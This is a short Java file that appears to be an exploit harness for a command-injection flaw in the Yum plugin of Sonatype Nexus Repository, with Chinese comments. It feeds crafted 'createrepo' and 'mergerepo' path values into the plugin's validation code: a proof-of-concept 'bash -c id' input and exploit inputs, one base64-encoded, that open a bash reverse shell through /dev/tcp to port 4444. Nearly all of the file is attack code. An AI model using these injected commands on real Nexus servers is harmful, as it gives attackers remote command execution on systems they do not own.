package com.exp.cve;

import org.sonatype.nexus.yum.internal.capabilities.YumCapability_2_14_14;
import org.sonatype.nexus.yum.internal.capabilities.YumCapability_2_14_9;

/**
 * > 模拟在 nexus 的 Yum Configuration 输入 `Path of "createrepo"` 或 `Path of "mergerepo"` 的情况
 * > https://github.com/sonatype/nexus-public/blob/2ba4210946b81167a8b02e9e8f132e054df190c3/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L82
 */
public class Main {
	
	/**
	 * > 默认提供的注入命令仅适用于 Linux 环境
	 * > 若在 winodws 环境 debug， 需要修改注入命令
	 * @param args
	 */
	public static void main(String[] args) {
		test_2_14_9();
		test_2_14_14();
	}
	
	
	public static void test_2_14_9() {
		/* PoC */
		String input = "bash -c id || python";
		
		/* EXP-1 */
//		String input = "bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/4444 0>&1 || python";
		
		/* EXP-2 */
//		String input = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i} || python";

		
		YumCapability_2_14_9.validate("createrepo", input, "[0.9.9,)");
//		YumCapability_2_14_9.validate("mergerepo", input, "[0.1,)");
	}
	
	
	public static void test_2_14_14() {
		/* PoC */
//		String input = "/bin/bash -c id || /createrepo";
		
		/* EXP */
		String input = "/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/4444 0>&1 || /createrepo";
		
		YumCapability_2_14_14.validate("createrepo", input, "[0.9.9,)");
//		YumCapability_2_14_14.validate("mergerepo", input, "[0.1,)");
	}
	

}